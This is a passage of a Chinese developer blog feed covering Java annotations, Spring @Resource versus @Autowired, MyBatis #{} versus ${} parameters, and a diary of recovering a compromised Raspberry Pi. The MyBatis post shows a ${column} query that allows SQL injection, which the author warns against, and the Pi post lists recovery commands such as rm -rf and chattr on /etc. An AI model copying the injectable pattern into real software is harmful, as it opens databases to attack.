同时类声明中也没有这个类型的注解, 那么注解类型会自动查询该类的父类</p><p>这个过程将会不停地重复, 直到该类型的注解被找到为止, 或是到达类结构的顶层(Object)</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Retention</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Documented</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Inherited</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">METHOD</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Documented</span><span class="token annotation punctuation">@Inherited</span><span class="token annotation punctuation">@interface</span> <span class="token class-name">Simple</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="自定义注解"><a href="#自定义注解" class="headerlink" title="自定义注解"></a>自定义注解</h2><p>使用 @interface 自定义注解, 注解类自动继承 <code>java.lang.annotation.Annotation</code> 接口, 由编译程序自动完成其他细节</p><p>在定义注解时, 不能继承其他的注解或接口</p><ul><li><code>@interface</code> 用来声明一个注解</li><li>注解类里的每一个<strong>方法实际上是声明了一个配置参数</strong><ul><li>方法的名称就是参数的名称</li><li>返回值类型就是参数的类型</li><li>可以通过 <code>default</code> 来声明参数的默认值</li></ul></li></ul><h3 id="注解参数-即注解类中的方法"><a href="#注解参数-即注解类中的方法" class="headerlink" title="注解参数(即注解类中的方法)"></a>注解参数(即注解类中的方法)</h3><ol><li>修饰符只能用 <code>public</code> 或默认(<code>default</code>)这两个访问权修饰, 默认为 <code>default</code> 类型</li><li>注解参数只支持以下数据类型<ul><li>基本数据类型(int, float, boolean, byte, double, char, long, short)</li><li>String 类型</li><li>Class 类型</li><li>Enum 类型</li><li>Annotation 类型</li><li>以上所有类型的数组</li></ul></li><li>命名: 对取名没有要求, 如果只有一个参数成员, 最好把参数名称设为 <code>value</code>, 后加小括号</li><li>参数注解中的方法不能存在参数</li><li>默认值: 可以包含默认值, 使用 <code>default</code> 来声明默认值</li></ol><h3 id="注解是如何工作的"><a href="#注解是如何工作的" class="headerlink" title="注解是如何工作的"></a>注解是如何工作的</h3><p>当注解标注到某个类或者方法或者某个成员变量或者某个输入参数上的时候, 一定有一个对应的机制来对注解标注的类、方法、成员变量和参数进行某些处理</p><p>例如我们常用的 Spring 中的 <code>@Service</code> 注解, Spring 在启动 IOC 容器的时候会对每个类进行扫描</p><p>把所有标注 <code>@Component</code> 及其子注解如 <code>@Service</code> 的类进行 Bean 处理</p><p>再例如我们上面自定义的 <code>@Simple</code> 注解, 在 Spring 的拦截器 HandlerInterceptor 中实现 <code>@Simple</code> 注解的业务逻辑, 这里使用了反射机制</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">preHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span><span class="token class-name">HandlerMethod</span> hm <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HandlerMethod</span><span class="token punctuation">)</span> handler<span class="token punctuation">;</span><span class="token comment">// 查看方法是否有 @Simple 注解</span><span class="token class-name">AuthCheck</span> ac <span class="token operator">=</span> hm<span class="token punctuation">.</span><span class="token function">getMethodAnnotation</span><span class="token punctuation">(</span><span class="token class-name">Simple</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>ac <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 有的话在这里进行业务逻辑操作</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://juejin.cn/post/6844903897908133902">Java注解-元数据、注解分类、内置注解和自定义注解</a></li><li><a href="https://juejin.cn/post/6844903878765314062">Java中的注解是怎样工作的</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Resource And Autowired 注解的区别</title>
      <link href="/2021/03/06/resourceandautowired/"/>
      <url>/2021/03/06/resourceandautowired/</url>
      
        <content type="html"><![CDATA[<p>今天项目上线后出现一个生产问题, <code>@Resource</code> 注解注入 <code>systemTaskService</code> 对象失败, 导致对象空指针了</p><p>但是本次修改内容修改了很多地方, 都使用 <code>@Resource</code> 注解引用了该对象, 然而只有这一处注入失败, 其他位置都正常…</p><p>这就很奇怪了，修改内容都一样，所以只测了几个地方没有问题就认为可以了，坑啊…这是为啥呢?</p><p>好奇的我就复习了一下 <code>@Resource</code> 和 <code>@Autowired</code> 的区别</p><h2 id="共同点"><a href="#共同点" class="headerlink" title="共同点"></a>共同点</h2><p><code>@Resource</code> 和 <code>@Autowired</code> 都可以作为注入属性的修饰</p><p>在接口仅有单一实现类时, 两个注解的修饰效果相同, 可以互相替换, 不影响使用</p><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1"></a>示例 1</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>service</span><span class="token punctuation">;</span> <span class="token comment">/** * service接口定义 * @author Administrator */</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Human</span> <span class="token punctuation">{</span>    <span class="token comment">/**     * 跑马拉松     * @return     */</span>    <span class="token class-name">String</span> <span class="token function">runMarathon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span> <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">Human</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Service</span></span><span class="token punctuation">;</span> <span class="token comment">/** * service接口第一实现类 * @author Administrator */</span><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Man</span> <span class="token keyword">implements</span> <span class="token class-name">Human</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">runMarathon</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"A man run marathon"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span> <span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Resource</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">Human</span></span><span class="token punctuation">;</span> <span class="token comment">/** * controller层实现类 * @author Administrator */</span><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/an"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HumanController</span> <span class="token punctuation">{</span>     <span class="token annotation punctuation">@Resource</span>    <span class="token keyword">private</span> <span class="token class-name">Human</span> human<span class="token punctuation">;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/run"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">runMarathon</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> human<span class="token punctuation">.</span><span class="token function">runMarathon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至此，代码整理完成，启动后输出 <code>A man run marathon</code></p><p>将 <code>HumanController.java</code> 类中的注解替换为 <code>@Autowired</code>, 再次启动, 仍然输出 <code>A man run marathon</code></p><p><strong>在接口仅有单一实现类时, 两个注解的修饰效果相同, 可以互相替换, 不影响使用</strong></p><h2 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h2><h3 id="Resource-是-Java-自己的注解"><a href="#Resource-是-Java-自己的注解" class="headerlink" title="@Resource 是 Java 自己的注解"></a><code>@Resource</code> 是 Java 自己的注解</h3><p><code>@Resource</code> 有两个属性是比较重要的，分是 <code>name</code> 和 <code>type</code></p><p>Spring 将 <code>@Resource</code> 注解的 <code>name</code> 属性解析为 <code>bean</code> 的名字, 而 <code>type</code> 属性则解析为 <code>bean</code> 的类型:</p><ul><li>如果使用 <code>name</code> 属性, 则使用 <code>byName</code> 的自动注入策略</li><li>如果使用 <code>type</code> 属性, 则使用 <code>byType</code> 自动注入策略</li><li>如果既不指定 <code>name</code> 也不指定 <code>type</code> 属性, 这时将通过反射机制使用 <code>byName</code> 自动注入策略</li></ul><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例 2"></a>示例 2</h3><p>再次修改<a href="#%E7%A4%BA%E4%BE%8B1">示例 1</a> 的代码, 增加一个实现类 <code>Woman.java</code>, <code>HumanController.java</code> 注解仍然使用 <code>@Resource</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span> <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">Human</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Service</span></span><span class="token punctuation">;</span> <span class="token comment">/** * service接口第二实现类 * @author Administrator */</span><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Woman</span> <span class="token keyword">implements</span> <span class="token class-name">Human</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">runMarathon</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"An woman run marathon"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时启动项目, 控制台会报错, 报错信息太多, 截取关键信息 <code>expected single matching bean but found 2: man,woman</code>:</p><pre class="line-numbers language-log" data-language="log"><code class="language-log"><span class="token date number">2021-03-06</span> <span class="token time number">21:22:22.222</span>  <span class="token level warning important">WARN</span> <span class="token number">2222</span> <span class="token separator comment">---</span> <span class="token punctuation">[</span>  restartedMain<span class="token punctuation">]</span> ConfigServletWebServerApplicationContext <span class="token operator">:</span> Exception encountered during context initialization <span class="token operator">-</span> cancelling refresh attempt<span class="token operator">:</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>BeanCreationException<span class="token operator">:</span> Error creating bean with name <span class="token string">'humanController'</span><span class="token operator">:</span> Injection of resource dependencies failed<span class="token operator">;</span> nested exception is org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>NoUniqueBeanDefinitionException<span class="token operator">:</span> No qualifying bean of type <span class="token string">'com.example.annotation.service.Human'</span> <span class="token property">available:</span> <span class="token property">expected single matching bean but found 2:</span> man<span class="token punctuation">,</span>woman<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>期望的单一结果被匹配到两个结果 <code>man</code> 和 <code>woman</code></p><p>在接口有多个实现类时, 就需要额外的处理才能正常使用</p><p>需要指定 <code>@Resource</code> 注解的 <code>name</code> 属性或使用 <code>@Qualifier</code> 来确定用哪一个实现类</p><p><code>HumanController.java</code> 代码修改为下面任意一种代码, 指定 <code>Human</code> 接口的实现类是 <code>Woman.java</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Resource</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"woman"</span><span class="token punctuation">)</span><span class="token keyword">private</span> <span class="token class-name">Human</span> human<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Resource</span><span class="token annotation punctuation">@Qualifier</span><span class="token punctuation">(</span><span class="token string">"woman"</span><span class="token punctuation">)</span><span class="token keyword">private</span> <span class="token class-name">Human</span> human<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>再次启动程序, 输出内容为 <code>An woman run marathon</code></p><h3 id="Autowired-是-Spring-的注解"><a href="#Autowired-是-Spring-的注解" class="headerlink" title="@Autowired 是 Spring 的注解"></a><code>@Autowired</code> 是 Spring 的注解</h3><p><code>@Autowired</code> 是 Spring 2.5 版本引入的, <code>Autowired</code> 只根据 <code>type</code> 进行注入, 不会去匹配 <code>name</code></p><p>如果涉及到 <code>type</code> 无法辨别注入对象时, 那需要依赖 <code>@Qualifier</code> 或 <code>@Primary</code> 注解一起来修饰</p><h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例 3"></a>示例 3</h3><p>将<a href="#%E7%A4%BA%E4%BE%8B2">示例 2</a> 中的注解替换为 <code>@Autowired</code>:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Autowired</span><span class="token keyword">private</span> <span class="token class-name">Human</span> human<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>再次启动时报错:</p><pre class="line-numbers language-log" data-language="log"><code class="language-log"><span class="token property">Description:</span><span class="token file-path string">/source/_posts/ResourceAndAutowired.md</span>Field human in com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>controller<span class="token punctuation">.</span>HumanController required a single bean<span class="token punctuation">,</span> but <span class="token number">2</span> were found<span class="token operator">:</span>    <span class="token operator">-</span> man<span class="token operator">:</span> defined in file <span class="token punctuation">[</span><span class="token file-path string">/Users/baojunjie/CrazyProjects/Annotation/target/classes/com/example/annotation/service/impl/Man.class</span><span class="token punctuation">]</span>    <span class="token operator">-</span> woman<span class="token operator">:</span> defined in file <span class="token punctuation">[</span><span class="token file-path string">/Users/baojunjie/CrazyProjects/Annotation/target/classes/com/example/annotation/service/impl/Woman.class</span><span class="token punctuation">]</span> <span class="token property">Action:</span>Consider marking one of the beans as <span class="token operator">@</span>Primary<span class="token punctuation">,</span> updating the consumer to accept multiple beans<span class="token punctuation">,</span> or using <span class="token operator">@</span>Qualifier to identify the bean that should be consumed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>报错信息很明显, <code>HumanController.java</code> 需要一个 <code>bean</code> 实现, 但是找到了两个: <code>man</code> 和 <code>woman</code></p><p>两种解决方案: </p><ul><li>使用 <code>@Primary</code> 注解, 在有多个实现 <code>bean</code> 时告诉 Spring 首先用 <code>@Primary</code> 修饰的那个</li><li>使用 <code>@Qualifier</code> 来标注需要注入的类</li></ul><p>其中 <code>@Qualifier</code> 修改方式与<a href="#%E7%A4%BA%E4%BE%8B2">示例 2</a> 相同, 依然是修改 <code>HumanController.java</code> 中间注入的 <code>Human</code> 上面</p><p><code>@Primary</code> 是修饰实现类的</p><p>告诉 <code>Spring</code>, 如果有多个实现类时, 优先注入被 <code>@Primary</code> 注解修饰的那个</p><p>这里, 我们希望注入 <code>Man.java</code>, 那么修改 <code>Man.java</code> 为:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span> <span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Primary</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Service</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">Human</span></span><span class="token punctuation">;</span> <span class="token comment">/** * service接口第一实现类 * @author Administrator */</span><span class="token annotation punctuation">@Service</span><span class="token annotation punctuation">@Primary</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Man</span> <span class="token keyword">implements</span> <span class="token class-name">Human</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">runMarathon</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"A man run marathon"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再次启动应用, 就能看到正确的输出了 <code>A man run marathon</code></p><h3 id="然而"><a href="#然而" class="headerlink" title="然而"></a>然而</h3><p>然而, 重新看了它俩的区别后，还是没能解答我这个问题到底为什么…</p><p><img src="http://wx1.sinaimg.cn/large/a6e9cb00ly1gocq7wegazj21400u0n38.jpg"></p><p><img src="http://wx3.sinaimg.cn/large/a6e9cb00ly1gocq8fq6ncj21hc0u0apm.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 框架 </tag>
            
            <tag> Spring </tag>
            
            <tag> 注解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MyBatis mapper 文件中 $ 和</title>
      <link href="/2021/02/22/mybatismapper-and/"/>
      <url>/2021/02/22/mybatismapper-and/</url>
      
        <content type="html"><![CDATA[<p>一般来说，我们使用 <code>MyBatis Generator</code> 来生成 <code>mapper.xml</code> 文件时，会生成一些增删改查的文件.</p><p>这些文件中需要传入一些参数，传参数的时候，我们会注意到，参数的大括号外面，有两种符号，一种是 <code>#</code>，一种是 <code>$</code></p><p>这两种符号有什么区别呢？</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM huobi_unsold_transaction WHERE client_order_id = #{item.clientOrderOd};SELECT * FROM huobi_unsold_transaction ORDER BY ${column} desc;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>从上面的内容我们可以比较清楚的看到</p><p><code>#{}</code> 用于传递查询的参数. 一般用于从 <code>dao</code> 层传递一个 <code>string</code> 或者其他的参数过来, MyBatis 对这个参数会进行加引号等类型转换操作, 将参数转变为一个字符串或其他类型</p><p>比如, 这边我们想根据 <code>clientOrderOd</code> 查询某次交易的信息, 我们会从 <code>dao</code> 传一个参数，比如传 <code>A-FAST-2154204150680</code> 进来，MyBatis 生成对应的 SQL 为:</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM huobi_unsold_transaction WHERE client_order_id = 'A-FAST-2154204150680';<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而 <code>$</code> 则不同，我们一般用于 <code>order by</code> 的后面</p><p>此时 MyBatis 对这个参数不会进行任何的处理, 直接生成 SQL 语句</p><p>例如, 此处我们传入 <code>create_time</code> 作为参数，传入第二个 SQL 中</p><p>此时，MyBatis 生成的 SQL 语句为:</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM huobi_unsold_transaction ORDER BY create_time desc;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到, MyBatis 对其没有做任何的处理。</p><p>但是，我们一般推荐使用的是 <code>#{}</code>, 不使用 <code>${}</code> 的原因如下:</p><ul><li><code>${}</code> 会引起 SQL 注入, 因为 <code>${}</code> 会直接参与 SQL 编译</li><li>会影响 SQL 语句的预编译, 因为 <code>${}</code> 仅仅为一个纯碎的 <code>string</code> 替换, 在动态 SQL 解析阶段将会进行变量替换</li></ul><p>正是这个比较小的知识点, 导致我的弱智交易程序损失了好几块钱…所以记录在此…</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> 框架 </tag>
            
            <tag> MyBatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次树莓派被黑后紧急恢复系统和应用的经历</title>
      <link href="/2020/11/28/thepiwashacked/"/>
      <url>/2020/11/28/thepiwashacked/</url>
      
        <content type="html"><![CDATA[<h2 id="记一次树莓派被黑后紧急恢复系统和应用的经历"><a href="#记一次树莓派被黑后紧急恢复系统和应用的经历" class="headerlink" title="记一次树莓派被黑后紧急恢复系统和应用的经历"></a>记一次树莓派被黑后紧急恢复系统和应用的经历</h2><p>当时的情况是在外面发现我的博客和其他应用都打不开了</p><p>然后连 ssh 想看下怎么回事， 发现 ssh 也连不上了，每一台树莓派都连不上了，应该是内网穿透(<code>frp</code>)挂了</p><p>到家后 ssh 登录内网穿透所在机器，发现到处都在提示 <code>.../etc/ld.so.preload cannot be preloaded...</code></p><p>ssh 登录时提示, 使用 docker 命令时等等, 并且 docker 命令全都无法使用, 试了下其他机器，还好其他机器正常</p><p>不仅内网穿透挂了，docker 也挂了，开机启动项也都没了</p><p>赶紧查查这个提示是啥玩意…</p><h2 id="在病毒迫害下挣扎"><a href="#在病毒迫害下挣扎" class="headerlink" title="在病毒迫害下挣扎"></a>在病毒迫害下挣扎</h2><p>查资料说把 <code>ld.so.preload</code> 清空就行了 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">""</span> <span class="token operator">&gt;</span> /etc/ld.so.preload<span class="token function">reboot</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>清空后重启，还真有效，正常了，重新设置一下内网穿透和开机启动配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> frp/frpc_baozi.ini<span class="token function">vim</span> /etc/rc.local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>:wq</code> 告诉我 <code>rc.local</code> 保存失败?! 发现状态是新文件, 从另一个树莓派上传过来 一下试试</p><pre class="line-numbers language-jshell" data-language="jshell"><code class="language-jshell">scp root@192.168.6.130:/etc/rc.local /etc/rc.local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我去，又提示文件或文件夹不存在, 进入目录查看，却又发现文件存在…好吧，进去看看啥情况</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc<span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>发现开机启动配置文件 <code>rc.local</code> 在啊！</p><p>再次编辑 <code>rc.local</code> 文件仍然提示是新文件？！</p><p>查看文件信息啥情况…</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-l</span> rc.l*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现这玩意是个链接, 链接到的 <code>/etc/rc.d/rc.local</code>…！ <strong>就在此时系统又出问题了</strong>…再次清空重启(<code>echo "" &gt; /etc/ld.so.preload &amp;&amp; reboot</code>)后正常</p><p>查看另一个树莓派中 <code>/etc/ld.so.preload</code> 是有内容的，编辑文件与另一个树莓派的值一样后重启</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/ld.so.preload<span class="token function">reboot</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>再次设置内网穿透和启动项，没配完<strong>又跪了</strong>…</p><p>再再再次清空和重启(<code>echo "" &gt; /etc/ld.so.preload &amp;&amp; reboot</code>), 感觉是被黑了，查看最近历史命令 <code>history 1000</code>, 没发现什么异常, 好吧没啥头绪</p><p>但是既然刚才发现这个是连接，干脆删了，从另一个树莓派再穿一次过来试试, 看看可不可以</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> <span class="token parameter variable">-rf</span> rc.local<span class="token function">scp</span> root@192.168.6.130:/etc/rc.local /etc/rc.local<span class="token function">cat</span> /etc/rc.local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这次查看文件内容正常, 紧接着<strong>叕开始报错了！！！</strong> 清空，重启！</p><p>此时我敢肯定是被种木马了…</p><h2 id="反击"><a href="#反击" class="headerlink" title="反击"></a>反击</h2><p>赶紧趁现在还能偶尔正常操作会儿，备份下 docker 镜像</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> login<span class="token function">docker</span> push crazybun/arm-jenkins-jdk8<span class="token function">docker</span> push crazybun/arm-oracle-jdk<span class="token function">docker</span> push crazybun/maven<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>又不正常了，报错的时候 docker 也会跪, 发现 <code>rc.local</code> 又变了, <strong>有东西<code>一直</code>在改我系统文件</strong></p><p>查了下可以用 <code>chattr</code> 给文件或文件夹加锁/解锁</p><p>清空，这回给 <code>/etc</code> 目录加锁后重启</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">""</span> <span class="token operator">&gt;</span> /etc/ld.so.preloadchattr +i /etc<span class="token function">reboot</span><span aria-hidden="true" 